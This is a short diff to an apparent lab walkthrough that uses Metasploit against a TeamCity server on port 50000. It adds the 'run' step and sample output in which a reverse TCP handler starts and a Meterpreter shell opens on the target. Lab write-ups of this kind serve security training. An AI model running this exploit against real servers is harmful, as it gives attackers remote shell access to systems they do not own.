@@ -51,6 +51,17 @@ options
 set RHOSTS 10.10.252.192     # Target IP address
 set RPORT 50000              # Target port where TeamCity is running
 ```
-*
+*Once all the necessary parameters (like RHOSTS, RPORT) are configured and verified using the options command, it's time to execute the exploit*
+```bash
+run   #or exploit
+```
+# Expected Output:
+*If the target is vulnerable and the configuration is correct, you should see output similar to this:*
+```bash
+[*] Started reverse TCP handler on 10.10.X.X:4444
+[*] Sending stage (57971 bytes) to 10.10.X.X
+[*] Meterpreter session 1 opened ...
+```
+*This confirms that you now have a meterpreter shell on the target machine!*
 
 
